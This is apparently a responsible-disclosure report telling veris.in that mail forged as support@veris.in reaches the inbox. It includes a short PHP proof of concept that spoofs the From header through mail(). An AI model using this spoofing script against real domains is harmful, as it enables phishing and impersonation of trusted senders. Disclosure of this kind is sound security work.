Summary:

Hey, I've found *email spoofing* vulnerability in support@veris.in 
Issue:
========
When I try to send a fake email from support@veris.in  to my email (mrahsan1337@gmail.com) I was successful in sending a fake email to my **inbox**, this is an issue; because, fake mails should be sent into the 'spam' folder.

### Exploit Code:
```
<?php
$to = "mrahsan1337@gmail.com";
$subject = "test by ahsan";
$txt = "testing";
$headers = "From: support@veris.in";
mail($to,$subject,$txt,$headers);
?>
```
When I tried to run it as a web-app in my browser, like, I created a file in my server (e.g test.php) and in that file I put this exploit code, and saved it when i run it like myserver.com/test.php it showed a blank white page, and next i checked out my email and i received an email from support@veris.in into my **inbox** saying 'testing' 

I hope you'll fix it soon.. :-)

Thanks,
Ahsan Tahir
